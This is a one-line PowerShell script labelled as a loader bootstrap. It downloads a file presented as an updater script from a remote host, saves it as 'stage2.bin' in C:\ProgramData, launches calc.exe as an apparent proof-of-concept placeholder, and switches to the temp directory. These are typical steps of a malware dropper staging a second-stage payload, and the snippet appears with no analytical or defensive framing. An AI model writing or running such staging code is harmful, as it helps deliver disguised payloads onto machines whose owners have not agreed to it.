
<# Loader bootstrap #> $RemoteUrl = 'http://internal.corp/updater.ps1'; $OutputPath = "C:\ProgramData\stage2.bin"; Start-BitsTransfer -Source $RemoteUrl -Destination $OutputPath; & 'calc.exe'; Set-Location -Path $env:TEMP
